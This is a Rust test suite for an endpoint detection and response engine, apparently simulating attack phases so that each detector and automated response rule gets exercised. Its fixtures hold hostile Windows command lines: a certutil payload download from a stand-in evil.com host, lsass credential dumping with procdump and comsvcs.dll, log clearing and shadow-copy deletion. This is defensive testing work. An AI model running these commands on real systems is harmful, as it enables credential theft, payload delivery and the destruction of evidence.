//! Full Attack Simulation: Exercises ALL detection engines + response rules
//! Each phase tests a specific detector in isolation with a fresh engine.
//! Verifies:
//!   - Events trigger the correct correlation detector
//!   - Alerts are persisted in DB
//!   - Automated response rules match each detection type

use monolith_backend::engine::detection::{DetectionEngine, DetectionResult};
use monolith_backend::engine::response_rules;
use monolith_shared::db::{Database, DatabaseConnection, DbParam, SqliteDatabase};
use serde_json::{json, Value};

const ENDPOINT_ID: &str = "sim-win10-01";

/// Build an in-memory database with migrations + seeded endpoint
async fn setup_db() -> Box<dyn DatabaseConnection> {
    let db = SqliteDatabase::new(":memory:");
    let conn = db.connect(&monolith_shared::config::DatabaseConfig {
        kind: monolith_shared::config::DatabaseKind::Sqlite,
        path: ":memory:".into(),
        max_connections: 1,
    }).await.expect("Failed to connect to in-memory SQLite");
    let conn: Box<dyn DatabaseConnection> = Box::new(conn);

    let migration_mgr = monolith_shared::db::MigrationManager::new();
    migration_mgr.run(&*conn).await.expect("Migration failed");

    let _ = conn.execute(
        "INSERT OR IGNORE INTO endpoints (id, hostname, platform, ip_address, status) VALUES (?1, ?2, ?3, ?4, ?5)",
        &[
            DbParam::Text(ENDPOINT_ID.into()),
            DbParam::Text("DESKTOP-SIM01".into()),
            DbParam::Text("windows".into()),
            DbParam::Text("192.168.1.100".into()),
            DbParam::Text("active".into()),
        ],
    ).await;

    conn
}

/// Seed IOCs in DB and load into the detection engine
async fn seed_iocs(db: &dyn DatabaseConnection, engine: &DetectionEngine) {
    let iocs = vec![
        ("ioc-eicar", "sha256", "131f95c51cc819465fa1797f6ccacf9d494aaaff46fa3eac73ae63ffbdfd8267"),
        ("ioc-c2-domain", "domain", "evil-c2.example.com"),
        ("ioc-c2-ip", "ip", "198.51.100.99"),
    ];
    for (id, ioc_type, value) in &iocs {
        let _ = db.execute(
            "INSERT OR IGNORE INTO iocs (id, ioc_type, value, description, severity, created_at) VALUES (?1, ?2, ?3, ?4, 'high', datetime('now'))",
            &[
                DbParam::Text(id.to_string()),
                DbParam::Text(ioc_type.to_string()),
                DbParam::Text(value.to_string()),
                DbParam::Text(format!("Test IOC: {}", value)),
            ],
        ).await;
    }

    let rows = db.query_value("SELECT ioc_type, value FROM iocs", &[]).await.unwrap();
    let ioc_values: Vec<Value> = rows.into_iter().map(|r| json!({
        "ioc_type": r.get("ioc_type").and_then(|v| v.as_str()).unwrap_or(""),
        "value": r.get("value").and_then(|v| v.as_str()).unwrap_or(""),
    })).collect();
    engine.load_iocs(&ioc_values);
}

fn make_event(event_type: &str, data: Value) -> Value {
    json!({
        "event_type": event_type,
        "timestamp": "2026-07-02T12:00:00Z",
        "data": data,
    })
}

async fn evaluate_and_alert(
    engine: &DetectionEngine,
    db: &dyn DatabaseConnection,
    event: &Value,
    endpoint_id: &str,
) -> Vec<monolith_backend::engine::detection::DetectionResult> {
    let results = engine.evaluate_event(event);
    for result in &results {
        let alert_id = uuid::Uuid::new_v4().to_string();
        let tag_list = result.tags.join(",");
        let _ = db.execute(
            "INSERT INTO alerts (id, endpoint_id, severity, title, description, score, status, rule_id, mitre_technique_id, tags, created_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, 'new', ?7, ?8, ?9, datetime('now'))",
            &[
                DbParam::Text(alert_id),
                DbParam::Text(endpoint_id.to_string()),
                DbParam::Text(result.severity.clone()),
                DbParam::Text(result.rule_name.clone()),
                DbParam::Text(format!("Detection: {} (score: {:.1})", result.rule_name, result.score)),
                DbParam::Real(result.score),
                DbParam::Text(result.rule_id.clone()),
                DbParam::Text(result.mitre_technique_id.clone().unwrap_or_default()),
                DbParam::Text(tag_list),
            ],
        ).await;
    }
    results
}

fn build_alert_info(result: &DetectionResult, endpoint_id: &str) -> response_rules::AlertInfo {
    let severity_score = match result.severity.as_str() {
        "critical" => 5,
        "high" => 4,
        "medium" => 3,
        "low" => 2,
        _ => 1,
    };
    let sources: Vec<response_rules::DetectionSource> = result.tags.iter()
        .filter_map(|t| t.parse::<response_rules::DetectionSource>().ok())
        .collect();
    let correlation_type = result.tags.iter()
        .find_map(|t| t.parse::<response_rules::CorrelationType>().ok());
    response_rules::AlertInfo {
        rule_id: result.rule_id.clone(),
        rule_name: result.rule_name.clone(),
        severity: result.severity.clone(),
        severity_score,
        score: result.score,
        endpoint_id: endpoint_id.to_string(),
        sources,
        correlation_type,
        file_path: None,
        pid: None,
    }
}

/// Helper: run one phase and evaluate response rules
async fn run_phase<F>(
    db: &dyn DatabaseConnection,
    phase_name: &str,
    expected_rule_prefix: &str,
    setup: F,
) where
    F: FnOnce(&DetectionEngine, &dyn DatabaseConnection) -> Vec<monolith_backend::engine::detection::DetectionResult>,
{
    let engine = DetectionEngine::new();
    seed_iocs(db, &engine).await;

    let results = setup(&engine, db);

    assert!(!results.is_empty(), "{}: expected detection, got none", phase_name);
    eprintln!("  [DETECTED] {} â€” rule={} severity={} score={}",
        phase_name, results[0].rule_id, results[0].severity, results[0].score);

    // Every detection result should start with the expected prefix
    assert!(results[0].rule_id.starts_with(expected_rule_prefix),
        "{}: expected rule prefix '{}', got '{}'",
        phase_name, expected_rule_prefix, results[0].rule_id);

    // Evaluate response rules
    let mut resp_engine = response_rules::RuleEngine::new(response_rules::default_rules());
    let info = build_alert_info(&results[0], ENDPOINT_ID);
    let actions = resp_engine.evaluate(&info);
    for action in &actions {
        eprintln!("    [AUTO-RESPONSE] {} â†’ {:?} on {}",
            action.rule_id, action.action, action.target_endpoint);
    }
}

// =========================================================================
// INDIVIDUAL PHASE TESTS
// =========================================================================

#[tokio::test]
async fn test_phase_brute_force() {
    let db = setup_db().await;
    run_phase(&*db, "brute_force", "correlation_brute_force", |engine, _db| {
        // Need >=5 user_logon events before detection triggers
        for _ in 0..6 {
            let event = make_event("user_logon", json!({"username": "admin", "status": "failed"}));
            let results = engine.evaluate_event(&event);
            if !results.is_empty() {
                return results;
            }
        }
        vec![]
    }).await;
    eprintln!("  [OK] Phase 1: Brute Force (T1110)");
}

#[tokio::test]
async fn test_phase_persistence_service() {
    let db = setup_db().await;
    run_phase(&*db, "persistence_service", "correlation_persistence", |engine, _| {
        engine.evaluate_event(&make_event("service_create", json!({
            "service_name": "BackdoorSvc", "image_path": "C:\\bad.exe", "start_type": "auto",
        })))
    }).await;
    eprintln!("  [OK] Phase 2a: Service Persistence (T1543.003)");
}

#[tokio::test]
async fn test_phase_persistence_task() {
    let db = setup_db().await;
    run_phase(&*db, "persistence_task", "correlation_persistence", |engine, _| {
        engine.evaluate_event(&make_event("scheduled_task", json!({
            "task_name": "Updater", "operation": "create", "command": "malware.exe",
        })))
    }).await;
    eprintln!("  [OK] Phase 2b: Scheduled Task Persistence (T1053.005)");
}

#[tokio::test]
async fn test_phase_lolbin_certutil() {
    let db = setup_db().await;
    run_phase(&*db, "lolbin_certutil", "correlation_lolbin_", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Users\\public\\p.exe",
        })))
    }).await;
    eprintln!("  [OK] Phase 3a: certutil LOLBin (T1218)");
}

#[tokio::test]
async fn test_phase_lolbin_rundll32() {
    let db = setup_db().await;
    run_phase(&*db, "lolbin_rundll32", "correlation_lolbin_", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "rundll32.exe -e javascript:\"\\..\\mshtml,RunHTMLApplication\";alert(1)",
        })))
    }).await;
    eprintln!("  [OK] Phase 3b: rundll32 LOLBin (T1218)");
}

#[tokio::test]
async fn test_phase_credential_dumping_procdump() {
    let db = setup_db().await;
    run_phase(&*db, "credential_procdump", "correlation_credential_dumping", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "procdump.exe -ma lsass.exe C:\\Users\\public\\lsass.dmp",
        })))
    }).await;
    eprintln!("  [OK] Phase 4a: Procdump Credential Dumping (T1003.001)");
}

#[tokio::test]
async fn test_phase_credential_dumping_comsvcs() {
    let db = setup_db().await;
    run_phase(&*db, "credential_comsvcs", "correlation_credential_dumping", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 1234 C:\\temp\\lsass.dmp full",
        })))
    }).await;
    eprintln!("  [OK] Phase 4b: comsvcs.dll Credential Dumping (T1003.001)");
}

#[tokio::test]
async fn test_phase_registry_hive_copy() {
    let db = setup_db().await;
    run_phase(&*db, "registry_hive_copy", "correlation_registry_hive_copy", |engine, _| {
        engine.evaluate_event(&make_event("file_create", json!({
            "path": "C:\\Users\\public\\config\\sam",
        })))
    }).await;
    eprintln!("  [OK] Phase 4c: Registry Hive Copy (T1003.002)");
}

#[tokio::test]
async fn test_phase_obfuscated_command() {
    let db = setup_db().await;
    run_phase(&*db, "obfuscated_command", "correlation_obfuscated", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "cmd.exe /c echo char(000)",
        })))
    }).await;
    eprintln!("  [OK] Phase 5: Obfuscated Command (T1027)");
}

#[tokio::test]
async fn test_phase_discovery_systeminfo() {
    let db = setup_db().await;
    run_phase(&*db, "system_discovery", "correlation_discovery_sequence", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "cmd.exe /c systeminfo",
        })));
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "whoami",
        })));
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "hostname",
        })))
    }).await;
    eprintln!("  [OK] Phase 6a: System Discovery (T1082)");
}

#[tokio::test]
async fn test_phase_discovery_netstat() {
    let db = setup_db().await;
    run_phase(&*db, "network_discovery", "correlation_discovery_sequence", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "netstat -an",
        })));
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "nbtstat",
        })));
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "net view",
        })))
    }).await;
    eprintln!("  [OK] Phase 6b: Network Discovery (T1049)");
}

#[tokio::test]
async fn test_phase_discovery_ipconfig() {
    let db = setup_db().await;
    run_phase(&*db, "network_config_discovery", "correlation_discovery_sequence", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "ipconfig /all",
        })));
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "route print",
        })));
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "arp -a",
        })))
    }).await;
    eprintln!("  [OK] Phase 6c: Network Config Discovery (T1016)");
}

#[tokio::test]
async fn test_phase_exfiltration() {
    let db = setup_db().await;
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;

    // Need 3 large transfers in last 50 events
    for _ in 0..3 {
        let event = make_event("network_connect", json!({
            "remote_address": "10.0.0.99",
            "bytes_sent": 60_000_000,
            "status": "established",
        }));
        let result = engine.evaluate_event(&event);
        if !result.is_empty() {
            let info = build_alert_info(&result[0], ENDPOINT_ID);
            let mut resp_engine = response_rules::RuleEngine::new(response_rules::default_rules());
            let actions = resp_engine.evaluate(&info);
            for a in &actions {
                eprintln!("    [AUTO-RESPONSE] {} â†’ {:?}", a.rule_id, a.action);
            }
            eprintln!("  [DETECTED] exfiltration â€” rule={} score={}", result[0].rule_id, result[0].score);
            assert!(result[0].rule_id.starts_with("correlation_data_exfiltration"), "Expected exfiltration rule");
            eprintln!("  [OK] Phase 7: Data Exfiltration (T1041)");
            return;
        }
    }
    panic!("exfiltration: not detected after 3 large transfers");
}

#[tokio::test]
async fn test_phase_indicator_removal_wevtutil() {
    let db = setup_db().await;
    run_phase(&*db, "indicator_removal_wevtutil", "correlation_indicator_removal", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "wevtutil cl system",
        })))
    }).await;
    eprintln!("  [OK] Phase 8a: Log Clearing (T1070)");
}

#[tokio::test]
async fn test_phase_indicator_removal_vssadmin() {
    let db = setup_db().await;
    run_phase(&*db, "indicator_removal_vssadmin", "correlation_indicator_removal", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "vssadmin delete shadows /all /quiet",
        })))
    }).await;
    eprintln!("  [OK] Phase 8b: VSS Deletion (T1070)");
}

#[tokio::test]
async fn test_phase_masquerading_cmd() {
    let db = setup_db().await;
    run_phase(&*db, "masquerading_cmd", "correlation_masquerading", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "image_path": "C:\\Users\\user\\AppData\\Local\\Temp\\cmd.exe",
            "name": "cmd.exe",
            "command_line": "cmd.exe /c whoami",
        })))
    }).await;
    eprintln!("  [OK] Phase 9a: Masquerading cmd.exe (T1036)");
}

#[tokio::test]
async fn test_phase_masquerading_powershell() {
    let db = setup_db().await;
    run_phase(&*db, "masquerading_powershell", "correlation_masquerading", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "image_path": "C:\\Users\\user\\Downloads\\powershell.exe",
            "name": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy RemoteSigned -Command Get-ChildItem",
        })))
    }).await;
    eprintln!("  [OK] Phase 9b: Masquerading powershell.exe (T1036)");
}

#[tokio::test]
async fn test_phase_remote_access_teamviewer() {
    let db = setup_db().await;
    run_phase(&*db, "remote_access_teamviewer", "correlation_remote_access_", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "name": "TeamViewer.exe",
        })))
    }).await;
    eprintln!("  [OK] Phase 10: Remote Access TeamViewer (T1219)");
}

#[tokio::test]
async fn test_phase_ioc_sha256() {
    let db = setup_db().await;
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;

    let results = engine.evaluate_event(&make_event("file_create", json!({
        "sha256": "131f95c51cc819465fa1797f6ccacf9d494aaaff46fa3eac73ae63ffbdfd8267",
    })));
    assert!(!results.is_empty(), "ioc_sha256: expected IOC match");
    assert!(results[0].rule_id.starts_with("ioc_match"), "Expected IOC rule");
    eprintln!("  [DETECTED] ioc_sha256 â€” rule={} score={}", results[0].rule_id, results[0].score);

    let info = build_alert_info(&results[0], ENDPOINT_ID);
    let mut resp_engine = response_rules::RuleEngine::new(response_rules::default_rules());
    let actions = resp_engine.evaluate(&info);
    for a in &actions {
        eprintln!("    [AUTO-RESPONSE] {} â†’ {:?} (KillAndQuarantine)", a.rule_id, a.action);
    }
    eprintln!("  [OK] Phase 11a: IOC SHA256 Match");
}

#[tokio::test]
async fn test_phase_ioc_domain() {
    let db = setup_db().await;
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;

    let results = engine.evaluate_event(&make_event("network_connect", json!({
        "domain": "evil-c2.example.com",
    })));
    assert!(!results.is_empty(), "ioc_domain: expected IOC match");
    assert!(results[0].rule_id.starts_with("ioc_match"), "Expected IOC rule");
    eprintln!("  [DETECTED] ioc_domain â€” rule={} score={}", results[0].rule_id, results[0].score);
    eprintln!("  [OK] Phase 11b: IOC Domain Match");
}

#[tokio::test]
async fn test_phase_network_scanning() {
    let db = setup_db().await;
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;

    // Need >20 failed connections to <=3 IPs in last 200 events
    for _ in 0..22 {
        let _ = engine.evaluate_event(&make_event("network_connect", json!({
            "local_port": 50001, "remote_address": "10.0.0.1", "remote_port": 445, "status": "failed",
        })));
    }
    let results = engine.evaluate_event(&make_event("network_connect", json!({
        "local_port": 50001, "remote_address": "10.0.0.1", "remote_port": 443, "status": "failed",
    })));
    assert!(!results.is_empty(), "network_scanning: expected detection");
    assert!(results[0].rule_id.starts_with("correlation_network_scanning"), "Expected scanning rule");
    eprintln!("  [DETECTED] network_scanning â€” rule={} score={}", results[0].rule_id, results[0].score);
    eprintln!("  [OK] Phase 12: Network Scanning (T1046)");
}

#[tokio::test]
async fn test_phase_suspicious_powershell() {
    let db = setup_db().await;
    run_phase(&*db, "suspicious_powershell", "correlation_powershell_suspicious", |engine, _| {
        engine.evaluate_event(&make_event("process_create", json!({
            "command_line": "powershell.exe -Command New-Object System.Net.WebClient",
        })))
    }).await;
    eprintln!("  [OK] Phase 13: Suspicious PowerShell (T1059.001)");
}

#[tokio::test]
async fn test_phase_response_rules_all_actions() {
    let db = setup_db().await;
    let mut resp_engine = response_rules::RuleEngine::new(response_rules::default_rules());
    let mut total_actions = 0;

    let mut check_result = |r: DetectionResult, label: &str| {
        let info = build_alert_info(&r, ENDPOINT_ID);
        let actions = resp_engine.evaluate(&info);
        eprintln!("  [{}] rule={} score={}", label, r.rule_id, r.score);
        for a in &actions {
            eprintln!("    [ACTION] {} â†’ {:?}", a.rule_id, a.action);
            total_actions += 1;
        }
    };

    // Brute force (fresh engine)
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;
    let mut bf = None;
    for _ in 0..10 {
        let r = engine.evaluate_event(&make_event("user_logon", json!({"username":"admin","status":"failed"})));
        if !r.is_empty() { bf = r.into_iter().last(); break; }
    }
    if let Some(r) = bf { check_result(r, "brute_force"); }

    // Credential dumping
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;
    if let Some(r) = e_dump(&engine).into_iter().last() { check_result(r, "cred_dump"); }

    // LOLBin
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;
    if let Some(r) = e_lolbin(&engine).into_iter().last() { check_result(r, "lolbin"); }

    // IOC
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;
    if let Some(r) = e_ioc(&engine).into_iter().last() { check_result(r, "ioc"); }

    // Masquerading
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;
    if let Some(r) = e_masq(&engine).into_iter().last() { check_result(r, "masq"); }

    // Indicator removal
    let engine = DetectionEngine::new();
    seed_iocs(&*db, &engine).await;
    if let Some(r) = e_indicator_removal(&engine).into_iter().last() { check_result(r, "indicator_removal"); }

    assert!(total_actions >= 4, "Expected >=4 response actions, got {}", total_actions);
    eprintln!("  [OK] Phase 14: Response Rules â€” {} actions triggered", total_actions);
}

fn e_dump(engine: &DetectionEngine) -> Vec<DetectionResult> {
    engine.evaluate_event(&make_event("process_create", json!({
        "command_line": "procdump.exe -ma lsass.exe C:\\Users\\public\\lsass.dmp",
    })))
}

fn e_lolbin(engine: &DetectionEngine) -> Vec<DetectionResult> {
    engine.evaluate_event(&make_event("process_create", json!({
        "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe p.exe",
    })))
}

fn e_ioc(engine: &DetectionEngine) -> Vec<DetectionResult> {
    engine.evaluate_event(&make_event("file_create", json!({
        "sha256": "131f95c51cc819465fa1797f6ccacf9d494aaaff46fa3eac73ae63ffbdfd8267",
    })))
}

fn e_masq(engine: &DetectionEngine) -> Vec<DetectionResult> {
    engine.evaluate_event(&make_event("process_create", json!({
        "image_path": "C:\\Users\\user\\AppData\\Local\\Temp\\cmd.exe",
        "name": "cmd.exe",
    })))
}

fn e_indicator_removal(engine: &DetectionEngine) -> Vec<DetectionResult> {
    engine.evaluate_event(&make_event("process_create", json!({
        "command_line": "wevtutil cl system",
    })))
}
